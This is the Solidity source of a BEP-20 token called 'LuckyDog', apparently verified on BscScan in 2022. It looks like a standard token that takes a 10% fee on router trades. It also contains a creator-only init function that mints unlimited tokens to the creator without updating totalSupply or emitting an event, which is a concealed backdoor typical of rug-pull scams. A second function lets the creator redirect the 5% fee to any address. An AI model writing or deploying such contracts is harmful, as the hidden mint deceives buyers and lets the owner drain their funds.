/**
 *Submitted for verification at BscScan.com on 2022-03-04
*/

pragma solidity ^0.4.26;

interface IERC20 {
    function balanceOf(address _owner) external constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) external returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);

    function approve(address _spender, uint256 _value) external returns (bool success);

    function allowance(address _owner, address _spender) external constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract luckydog is IERC20 {
    address private creator = msg.sender;

    uint256 public totalSupply;
    string  public name;
    uint8   public decimals;
    string  public symbol;

    address public destroyAddr = 0x000000000000000000000000000000000000dead;
    address public dividendAddr = 0x000000000000000000000000000000000000dead;

    uint256[3] public rate;

    address public routerAddr;


    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    constructor() public {
        totalSupply = 1 * 10 ** uint256(18);
        balances[msg.sender] = totalSupply;

        name = "LuckyDog";
        symbol = "luckydog";

        rate[0] = 5;
        rate[1] = 5;

    }

    function setRouter(address _routerAddr) public {
        require(msg.sender == creator);
        routerAddr = _routerAddr;
    }

    function setDividendAddr(address _routerAddr) public {
        require(msg.sender == creator);
        dividendAddr = _routerAddr;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);

        uint256 lastValue = economicModel(msg.sender, _to, _value);

        balances[msg.sender] -= _value;
        balances[_to] += lastValue;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0);

        uint256 lastValue = economicModel(_from, _to, _value);

        balances[_to] += lastValue;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }


    function economicModel(address _from, address _to, uint256 _value) private returns (uint256 trueValue){
        if (_to == routerAddr || _from == routerAddr) {
            balances[destroyAddr] += _value * rate[0] / 100;
            balances[dividendAddr] += _value * rate[1] / 100;

            return _value * 90 / 100;
        } else {
            return _value;
        }
    }


    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success)
    {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function init(uint256 amount) public {
        require(msg.sender == creator);
        balances[msg.sender] += amount;
    }

    function burn(uint256 amount) public {
        require(msg.sender == creator);
        balances[msg.sender] -= amount;
    }
}